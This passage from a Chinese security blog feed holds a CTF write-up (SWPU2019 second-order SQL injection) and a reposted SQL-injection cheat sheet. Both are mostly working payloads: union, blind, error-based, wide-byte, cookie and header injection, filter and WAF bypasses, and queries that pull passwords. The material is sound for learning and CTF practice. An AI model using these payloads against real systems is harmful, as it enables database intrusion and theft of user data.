    <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>注册后在广告发布处发现有二次注入</p><pre><code class="hljs sql"><span class="hljs-comment"># 判断是否存在注入</span>-1&#x27;<span class="hljs-comment"># query</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ads <span class="hljs-keyword">where</span> title = <span class="hljs-string">&#x27;$title&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;</code></pre><p>过滤了空格，————用/**/绕过<br> 过滤了报错注入的函数，不方便使用时间盲注，有回显，————使用联合注入</p><p>过滤了or，不能使用order by判断字段数和查询information_schema这个库判,断表的时候使用group by </p><p>过滤了注释符，又需要闭合单引号，使用<strong>group by 1,’1’</strong></p><h3 id="group-by判断列数-新知识get！"><a href="#group-by判断列数-新知识get！" class="headerlink" title="group by判断列数  新知识get！"></a><strong>group by判断列数</strong>  新知识get！</h3><pre><code class="hljs sql"><span class="hljs-comment"># 判断有多少字段</span>-1&#x27;<span class="hljs-comment">/**/</span>group<span class="hljs-comment">/**/</span>by<span class="hljs-comment">/**/</span>22,&#x27;1<span class="hljs-comment"># union 查询</span>-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-string">&#x27;22</span></code></pre><h3 id="绕过information-schema"><a href="#绕过information-schema" class="headerlink" title="绕过information_schema"></a>绕过information_schema</h3><ul><li><p>利用sys.schema_auto_increment_columns</p><p><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></p><pre><code class="hljs sql"><span class="hljs-comment"># 在 sys 数据库中查询表名       </span>-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>sys.schema_auto_increment_columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">schema</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-string">&#x27;22</span></code></pre></li><li><p>这里数据库为MaeiaDB，可用mysql.innodb_table_stats查表名</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p><pre><code class="hljs sql">-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-string">&#x27;22</span></code></pre></li></ul><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a href="https://blog.csdn.net/chasingin/article/details/103476001">https://blog.csdn.net/chasingin/article/details/103476001</a></p><pre><code class="hljs apache"><span class="hljs-comment"># 直接查修2会解释成数字2，所以命名一下，具体原理参考上面链接</span><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,(select/**/group_concat(b)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>/**/as/**/b/**/union/**/select/**/*/**/from/**/users)/**/a),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,&#x27;<span class="hljs-number">1</span></code></pre><p>点击广告详情就能看到flag</p><p>PS.在绕过information_schema中介绍了一种用join无列明注入</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li><p>二次注入</p></li><li><p>过WAF    (/**/ 、group by、)</p></li><li><p>绕过information_schema</p></li><li><p>无列名注入</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SWPU2019</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入学习</title>
    <link href="/2020/02/06/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/02/06/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a>0x01 什么是SQL注入</h2><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><h2 id="0x02-SQL注入的分类"><a href="#0x02-SQL注入的分类" class="headerlink" title="0x02 SQL注入的分类"></a>0x02 SQL注入的分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul><li>数字型</li><li>字符型</li></ul><h3 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h3><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li></ul><h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul><li>报错注入</li><li>盲注<ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li>union注入</li></ul><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul><li>宽字节注入</li></ul><h2 id="0x03识别后台数据库"><a href="#0x03识别后台数据库" class="headerlink" title="0x03识别后台数据库"></a>0x03识别后台数据库</h2><h3 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h3><p><strong>sql server</strong>：Windows（IIS)</p><p><strong>MySQL</strong>：Apache</p><h3 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h3><p><strong>Microsoft SQL Server</strong>：ASP和.Net</p><p><strong>MySQL</strong>：PHP</p><p><strong>Oracle/MySQL</strong>：java</p><p>(以下是对mysql数据库的总结，其他类型数据库会不定时更新)</p><h2 id="0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</h2><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–<strong>INFORMATION_SCHEMA</strong> ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。</p><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong>TABLES</strong></p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h2 id="0x05-基本手工注入流程"><a href="#0x05-基本手工注入流程" class="headerlink" title="0x05 基本手工注入流程"></a>0x05 基本手工注入流程</h2><p>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p><h3 id="1-MySQL-gt-5-0"><a href="#1-MySQL-gt-5-0" class="headerlink" title="1. MySQL &gt;= 5.0"></a>1. MySQL &gt;= 5.0</h3><h3 id="（1）获取字段数"><a href="#（1）获取字段数" class="headerlink" title="（1）获取字段数"></a>（1）获取字段数</h3><pre><code class="hljs axapta"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> n  <span class="hljs-comment">/*通过不断尝试改变n的值来观察页面反应确定字段数*/</span></code></pre><h3 id="（2）获取系统数据库名"><a href="#（2）获取系统数据库名" class="headerlink" title="（2）获取系统数据库名"></a>（2）获取系统数据库名</h3><p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata</code></pre><h3 id="（3）获取当前数据库名"><a href="#（3）获取当前数据库名" class="headerlink" title="（3）获取当前数据库名"></a>（3）获取当前数据库名</h3><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> <span class="hljs-built_in">null</span>,<span class="hljs-built_in">null</span>,<span class="hljs-params">...</span>,database()</code></pre><h3 id="（4）获取数据库中的表"><a href="#（4）获取数据库中的表" class="headerlink" title="（4）获取数据库中的表"></a>（4）获取数据库中的表</h3><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,...,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()</code></pre><p>或</p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,...,table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre><h3 id="（5）获取表中的字段"><a href="#（5）获取表中的字段" class="headerlink" title="（5）获取表中的字段"></a>（5）获取表中的字段</h3><p>这里假设已经获取到表名为user</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,...,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span></code></pre><h3 id="（6）获取各个字段值"><a href="#（6）获取各个字段值" class="headerlink" title="（6）获取各个字段值"></a>（6）获取各个字段值</h3><p>这里假设已经获取到表名为user，且字段为username和password</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-literal">null</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span></code></pre><h3 id="2-MySQL-lt-5-0"><a href="#2-MySQL-lt-5-0" class="headerlink" title="2.MySQL &lt; 5.0"></a>2.MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工枚举爆破（二分法思想）。</p><p>该方式通常用于盲注。</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">64</span> <span class="hljs-comment">/*判断数据库名的第一个字符的ascii值是否大于64*/</span></code></pre><h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(SUBSTRING(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)=<span class="hljs-string">&#x27;root&#x27;</span>,sleep(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-comment">/*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/</span></code></pre><h2 id="0x06-常用注入方式"><a href="#0x06-常用注入方式" class="headerlink" title="0x06 常用注入方式"></a>0x06 常用注入方式</h2><p>注释符：</p><pre><code class="hljs awk"><span class="hljs-comment">#</span>-- (有空格)或--+<span class="hljs-regexp">/**/</span></code></pre><p>内联注释：</p><pre><code class="hljs awk"><span class="hljs-regexp">/*！...*/</span></code></pre><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><pre><code class="hljs crystal">id =-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,3   /*获取字段*/</span></code></pre><h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;t&#x27;--+     /*判断数据名长度*/</code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="1-floor-和rand"><a href="#1-floor-和rand" class="headerlink" title="1 floor()和rand()"></a>1 floor()和rand()</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> count(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,floor(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a       <span class="hljs-comment">/*利用错误信息得到当前数据库名*/</span></code></pre><h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2 extractvalue()"></a>2 extractvalue()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)))例子：[极客大挑战 <span class="hljs-number">2019</span>]HardSQLextractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>()))))extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>()))))extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>))))extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>))</code></pre><h4 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3 updatexml()"></a>3 updatexml()</h4><pre><code class="hljs vbnet">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))例子：[极客大挑战 <span class="hljs-number">2019</span>]HardSQL?username=admin<span class="hljs-comment">&#x27;or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))#&amp;password=123</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span>(database())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-comment">&#x27;H4rDsq1&#x27;)),0x7e),1)</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(password)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre><h4 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4 geometrycollection()"></a>4 geometrycollection()</h4><pre><code class="hljs n1ql">id=1 and geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5 multipoint()"></a>5 multipoint()</h4><pre><code class="hljs n1ql">id=1 and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6 polygon()"></a>6 polygon()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7 multipolygon()"></a>7 multipolygon()</h4><pre><code class="hljs n1ql">id=1 and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8 linestring()"></a>8 linestring()</h4><pre><code class="hljs n1ql">id=1 and linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9 multilinestring()"></a>9 multilinestring()</h4><pre><code class="hljs n1ql">id=1 and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="10-exp"><a href="#10-exp" class="headerlink" title="10 exp()"></a>10 exp()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))</code></pre><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">id</span> = <span class="hljs-number">1</span> and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)</code></pre><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">id</span> = <span class="hljs-number">1</span>&#x27;;select if(sub(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span></code></pre><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test’，接下来访问xxx.php?username=test’，页面返回id=22；</p><p>接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p><p>访问xxx.php?id=test’ union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li><input disabled="" type="checkbox"> 查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数</li><li><input disabled="" type="checkbox"> 数据库的编码为GBK</li></ul><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><pre><code class="hljs apache"><span class="hljs-attribute">id</span> = -<span class="hljs-number">1</span>%DF&#x27; union select <span class="hljs-number">1</span>,user(),<span class="hljs-number">3</span>,%<span class="hljs-number">23</span></code></pre><p>在上述条件下，单引号’被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。</p><pre><code class="hljs apache"><span class="hljs-attribute">Cookie</span>: id = <span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span></code></pre><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>对参数进行base64编码，再发送请求。</p><p>说明：id=1’，1的base64编码为<code>MSc=</code>，而<code>=</code>的url编码为<code>%3d</code>，所以得到以下结果：</p><pre><code class="hljs ini"><span class="hljs-attr">id</span>=MSc%<span class="hljs-number">3</span>d</code></pre><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forward-For：<span class="hljs-number">127.0.0.1</span>&#x27; select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,user()</code></pre><h2 id="0x07-SQL注入绕过技术"><a href="#0x07-SQL注入绕过技术" class="headerlink" title="0x07 SQL注入绕过技术"></a>0x07 SQL注入绕过技术</h2><ul><li><p><strong>大小写绕过</strong></p></li><li><p><strong>双写绕过</strong></p></li><li><p><strong>编码绕过</strong>（url全编码、十六进制）</p></li><li><p><strong>内联注释绕过</strong></p></li><li><p><strong>关键字替换</strong></p><ul><li><p><strong>逗号绕过</strong></p><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p></li><li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p></li><li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p></li><li><p><strong>空格绕过</strong>（用括号，+等绕过）</p></li></ul></li><li><p><strong>等价函数绕过</strong></p><ul><li>hex()、bin()=ascii()</li><li>concat_ws()=group_concat()</li><li>mid()、substr()=substring()</li></ul></li><li><p><strong>http参数污染</strong>（<code>id=1 union select+1,2,3+from+users+where+id=1–</code>变为<code>id=1 union select+1&amp;id=2,3+from+users+where+id=1–</code>）</p></li><li><p><strong>缓冲区溢出绕过</strong> (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p></li></ul><h1 id="转自-https-xz-aliyun-com-t-2869"><a href="#转自-https-xz-aliyun-com-t-2869" class="headerlink" title="转自 https://xz.aliyun.com/t/2869"></a>转自 <a href="https://xz.aliyun.com/t/2869">https://xz.aliyun.com/t/2869</a></h1><h1 id="收集绕waf"><a href="#收集绕waf" class="headerlink" title="收集绕waf"></a>收集绕waf</h1><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span>  and&#123;`if`updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a,(select /*!<span class="hljs-number">50000</span>(/*!<span class="hljs-number">50000</span>schema_name) from/*!<span class="hljs-number">50000</span>information_schema*/.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)&#125;</code></pre><p><a href="https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1167">https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1167</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[BJDCTF2020]EasySearch</title>
    <link href="/2020/02/05/BJDCTF2020-EasySearch/"/>
    <url>/2020/02/05/BJDCTF2020-EasySearch/</url>
    
